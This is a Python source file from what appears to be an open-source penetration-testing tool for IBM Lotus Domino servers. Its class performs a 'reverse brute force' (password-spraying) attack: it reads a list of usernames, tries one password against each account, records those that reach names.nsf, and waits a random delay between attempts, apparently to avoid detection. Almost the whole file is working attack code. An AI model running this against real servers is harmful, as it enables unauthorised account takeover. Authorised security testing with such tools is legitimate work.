# Copyright (c) 2016, Brandan Geise [coldfusion]
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in
# all copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
import os
import random
import time
import tqdm


class BruteForce(object):
	"""Perform a reverse brute force attack with multiple usernames and one password"""

	def __init__(self, domiowned, usernames, password):
		self.domiowned = domiowned
		self.usernames = usernames
		self.password = password

		self.valid_accounts = []

	def bruteforce(self):
		# Import usernames from file
		f = open(os.path.abspath(self.usernames), 'r').read()
		username_list = f.rstrip().split('\n')

		# Setup progress bar
		progress_bar = tqdm.tqdm(
			total=len(username_list),
			desc="Progress",
			smoothing=0.5,
			bar_format='{desc}{percentage:3.0f}%|{bar}|{elapsed} '
		)

		# Start reverse brute force
		for username in username_list:
			self.domiowned.data = {}
			self.domiowned.session.cookies.clear()
			try:
				has_access = self.domiowned.get_access(username, self.password)
				if has_access['names.nsf']:
					self.valid_accounts.append(username)

			except KeyboardInterrupt:
				break

			except Exception as error:
				print(error)
				self.valid_accounts = False
				break

			progress_bar.update(1)
			time.sleep(random.random())

		progress_bar.close()

		return self.valid_accounts
